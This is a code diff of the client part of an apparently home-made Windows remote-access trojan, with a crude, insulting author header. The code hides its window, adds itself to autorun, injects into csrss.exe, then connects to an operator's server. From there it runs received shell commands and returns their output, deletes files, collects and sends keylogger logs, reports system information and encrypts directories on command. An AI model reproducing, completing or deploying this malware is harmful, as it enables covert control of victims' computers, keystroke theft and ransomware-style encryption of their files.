@@ -1,8 +1,8 @@
 /*
  * WARNING!
- * данное програмное обеспечение является полной собственностью автора
- * не предназначено для тупых школьников, в частности школоло - даунов
- * coded by govnocoder na poscale
+ * This software is the full property of the author
+ * Not intended for dumb kids
+ * Copyright (c) 2019-2020 by Nikait
  * FSB and FBR suck my dick bitch
  *
  * client part
@@ -10,123 +10,45 @@
 
 
 #include <winsock2.h>
-#include <windows.h>
-//#include <stdlib.h>
 #include <fstream>
-//#include <process.h>
-//#include <limits.h>
 #include <string>
-//#include <cstdlib>
 
-#include <vector>
-#include <tlhelp32.h>
 
 #include "Autorun.h"
 #include "Config.h"
-#include "Server.h"
+#include "Socket.h"
 #include "Crypt.h"
-//#include "Utils.h"
+#include "Utils.h"
 #include "Keylogger.h"
-
-//#pragma comment(lib, "ws2_32.lib")
-//#pragma comment(lib, "ntdll.lib")
-//#pragma comment(linker,"/BASE:0x13140000")
 
 #pragma warning(disable: 4996)
 
-using std::vector;
-
-std::string readFile(const std::string fileName) {
-	std::ifstream f(fileName);
-	f.seekg(0, std::ios::end);
-	size_t size = f.tellg();
-	std::string s(size, ' ');
-	f.seekg(0);
-	f.read(&s[0], size);
-	return s;
-}
-
-/*
-std::wstring string_to_wstring(std::string& s) {
-	std::ofstream ofs("temp.txt", std::ofstream::out);
-	if (!ofs) exit(1);
-	ofs << s;
-	ofs.close();
-
-	std::wstring s1;
-	std::wifstream wifs("temp.txt", std::wifstream::in);
-	if (!wifs) exit(1);
-	wifs >> s1;
-	wifs.close();
-	system("del temp.txt");
-	return s1;
-}
-
-std::string wstring_to_string(std::wstring s) {
-	std::wofstream wofs("temp.txt", std::wofstream::out);
-	if (!wofs) exit(1);
-	wofs << s;
-	wofs.close();
-
-	std::string s1;
-	std::ifstream ifs("temp.txt", std::ifstream::in);
-	if (!ifs) exit(1);
-	ifs >> s1;
-	ifs.close();
-	system("del temp.txt");
-	return s1;
-}
-
-std::string readFile(const std::string fileName) {
-	std::ifstream f(fileName);
-	f.seekg(0, std::ios::end);
-	size_t size = f.tellg();
-	std::string s(size, ' ');
-	f.seekg(0);
-	f.read(&s[0], size);
-	return s;
-}
-
-vector<std::string> scandir(std::string p) {
-	std::wstring Path = string_to_wstring(p);
-
-	WIN32_FIND_DATA FindFileData;
-	HANDLE hf;
-
-	hf = FindFirstFile((string_to_wstring(p)).c_str(), &FindFileData);
-
-	vector<std::string> v;
-	if (hf != INVALID_HANDLE_VALUE) {
-		do {
-			if (FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
-				v.push_back(wstring_to_string(FindFileData.cFileName));
-		} while (FindNextFile(hf, &FindFileData) != 0);
-	}
-
-	return v;
-}
-*/
-DWORD GetProcessID(const char* lpNameProcess)
-{
-	HANDLE snap;
-	PROCESSENTRY32 pentry32;
-	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (snap == INVALID_HANDLE_VALUE) return 0;
-	pentry32.dwSize = sizeof(PROCESSENTRY32);
-	if (!Process32First(snap, &pentry32)) { CloseHandle(snap); return 0; }
-	do {
-		if (!lstrcmpi((LPCWSTR)lpNameProcess, &pentry32.szExeFile[0])) {
-			CloseHandle(snap);
-			return pentry32.th32ProcessID;
-		}
-	} while (Process32Next(snap, &pentry32));
-	CloseHandle(snap);
-	return 0;
-}
-
-
 std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars;
 
+int Shell(SOCKADDR_IN addr);
+
+
+int main() {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	setlocale(LC_ALL, "Russian");
+	// autorun
+	RegisterProgram();
+	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);
+
+	HINSTANCE hKernel;
+	int i = 1;
+	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
+	if (hKernel) {
+		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
+			GetProcAddress(hKernel, "RegisterServiceProcess");
+	}
+	// end autorun
+
+	// server configuration start
+	SOCKADDR_IN add = Server();
+	Shell(add);
+	return 0;
+}
 
 int Shell(SOCKADDR_IN addr) {
 	char path[2048];
@@ -150,12 +72,12 @@ int Shell(SOCKADDR_IN addr) {
 			system(comm.c_str());
 			std::ifstream F;
 			F.open("file.txt", std::ios::in);
-			
+
 			while (getline(F, loc_buf_file)) {
 				buf_file += loc_buf_file + '\n';
 			}
 			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);
+			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
 
 		}
 
@@ -165,7 +87,7 @@ int Shell(SOCKADDR_IN addr) {
 			std::string comm = "del " + std::string(path);
 			system(comm.c_str());
 			std::string finally_msg = "delete " + std::string(path) + " ok";
-			send(conn, finally_msg.c_str(), sizeof(finally_msg)*10, NULL);
+			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);
 
 		}
 
@@ -188,7 +110,7 @@ int Shell(SOCKADDR_IN addr) {
 				buf_file += loc_buf_file + '\n';
 			}
 			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file)*100, NULL);
+			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
 		}
 
 		else if (strcmp(buffer, "sysinfo") == 0) {
@@ -238,7 +160,7 @@ int Shell(SOCKADDR_IN addr) {
 			memset(&path, 0x0, sizeof(path));
 			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
 			recv(conn, path, sizeof(path), NULL);
-			while (buf.length() < unsigned int(atoi(path)+7) && rbuf.length() < unsigned int(atoi(path)+7)) {
+			while (buf.length() < unsigned int(atoi(path) + 7) && rbuf.length() < unsigned int(atoi(path) + 7)) {
 				keylogger(keylog_path);
 				buf = readFile(keylog_path + "keylog.txt");
 				rbuf = readFile(keylog_path + "keylogru.txt");
@@ -265,37 +187,17 @@ int Shell(SOCKADDR_IN addr) {
 		}
 
 		else if (!strcmp(buffer, "cryptdir")) {
-		char key[128];
-		memset(&path, 0x0, sizeof(path));
-		memset(&key, 0x0, sizeof(key));
-		recv(conn, path, sizeof(path), NULL);
-		recv(conn, key, sizeof(key), NULL);
-		std::string res = CryptDir(path, atoi(key));
-		send(conn, res.c_str(), sizeof(res) * 300, NULL);
+			char key[128];
+			memset(&path, 0x0, sizeof(path));
+			memset(&key, 0x0, sizeof(key));
+			recv(conn, path, sizeof(path), NULL);
+			recv(conn, key, sizeof(key), NULL);
+			std::string res = CryptDir(path, atoi(key));
+			send(conn, res.c_str(), sizeof(res) * 300, NULL);
 		}
 
-		else if (strcmp(buffer, "close") == 0) return 1; 
+		else if (strcmp(buffer, "close") == 0) return 1;
 	}
-	return 0;
-}
-
-
-int main() {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	setlocale(LC_ALL, "Russian");
-	// autorun
-	RegisterProgram();
-	Inject(OpenProcess(PROCESS_ALL_ACCESS, false, GetProcessID("csrss.exe")), &func);
-
-	HINSTANCE hKernel;
-	int i = 1;
-	hKernel = LoadLibrary((LPCWSTR)"KERNEL32.DLL");
-	if (hKernel) {
-		RegisterServiceProcess = (int(__stdcall*)(DWORD, DWORD))
-			GetProcAddress(hKernel, "RegisterServiceProcess");
-	}
-	SOCKADDR_IN add = Server();
-	Shell(add);
 	return 0;
 }
 
